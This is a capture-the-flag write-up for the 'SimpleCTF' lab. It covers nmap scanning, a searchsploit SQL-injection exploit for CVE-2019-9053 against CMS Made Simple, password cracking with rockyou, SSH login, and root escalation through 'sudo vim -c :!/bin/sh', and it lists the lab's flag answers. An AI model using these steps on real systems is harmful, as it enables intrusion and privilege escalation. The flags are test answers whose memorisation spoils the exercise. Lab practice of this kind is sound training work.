# SimpleCTF

## #1 How many services are running under port 1000?
Save ip as a variable
```
export ip=<ip>
```

Run Nmap scan to scan the host for open ports
```
nmap $ip
21/tcp   closed ftp
80/tcp   closed http
2222/tcp closed EtherNetIP-1
```
Answer:
`
2
`


## #2 What is running on the higher port?
```
nmap -p2222 -sV -sC $ip

2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
```

Answer:
`
SSH
`

## #3 What's the CVE you're using against the application?
CMS Made Simple version 2.2.8

Answer:
`
CVE-2019-9053
`

## #4 To what kind of vulnerability is the application vulnerable?

Answer:
`
sqli
`
## #5 What's the password?
Search for exploit using searchsploit
```
searchsploit cms made simple
```

Copying the exploit file to folder
```
searchsploit -m php/webapps/46635.py
```

Using the exploit to get username and password
```
python 46635.py -u http://$ip/simple -c -w /opt/rockyou.txt

[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret
```

Answer
`
secret
`

## #6 Where can you login with the details obtained?
Connect to SSH
```
ssh mitch@$ip -p 2222
```

## #7 What's the user flag?
```
cd
cat user.txt
```

Answer:
`
G00d j0b, keep up!
`

## #8 Is there any other user in the home directory? What's its name?
Start with stabilizing the shell
```
python -c "import pty; pty.spawn('/bin/bash')" 
```
ls the user folders
```
cd
cd ..
ls
mitch  sunbath
```

Answer:
`
sunbath
`

## #9 What can you leverage to spawn a privileged shell?
List out what we can do
```
sudo -l
```
We can use vim as root without using the password
```
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```

Get root by using vim.
```
sudo vim -c ':!/bin/sh'
```

Answer:
`
vim
`

## #10 What's the root flag?
Stabilize the shell after getting root
```
python -c "import pty; pty.spawn('/bin/bash')"
```
```
cat /root/root.txt
```

Answer:
`
W3ll d0n3. You made it!
`
